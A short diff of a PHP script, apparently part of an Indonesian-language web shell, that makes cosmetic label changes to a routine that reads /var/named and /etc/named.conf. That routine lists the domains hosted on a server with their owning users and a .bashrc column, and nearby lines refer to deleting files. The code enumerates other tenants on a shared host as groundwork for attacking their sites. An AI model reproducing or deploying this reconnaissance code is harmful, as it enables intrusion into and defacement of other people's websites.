@@ -22,7 +22,7 @@ if ($domains or $d0mains)
 {
     $domains = scandir("/var/named");
     if($domains) {
-echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th></tr>";
+echo "<table align='center'><tr><th> NOMER </th><th> DOMAIN </th><th> USER </th></tr>";
 $count=1;
 $dc = 0;
 $list = scandir("/var/named");
@@ -42,12 +42,12 @@ $dc++;
 }
 echo '</table>';
 $total = $dc;
-echo '<br><div class="result">Domain Yang Ketemu = '.$total.'</h3><br />';
+echo '<center><br><div class="result">Domain Yang Ketemu = '.$total.'</h3><br />';
 echo '</center>';
 }else{
 $d0mains = @file('/etc/named.conf');
     if($d0mains) {
-echo "<table align='center'><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> </th><th> .bashrc </th></tr>";
+echo "<table align='center'><tr><th> NOMER </th><th> DOMAIN </th><th> USER </th><th> </th><th> .bashrc </th></tr>";
 $count=1;
 $dc = 0;
 $mck = array();
@@ -118,4 +118,3 @@ echo "<font color=#>Hati - Hati FIle gagal dihapus . . . ! ! !</br>";
 
 ?>
 
-d
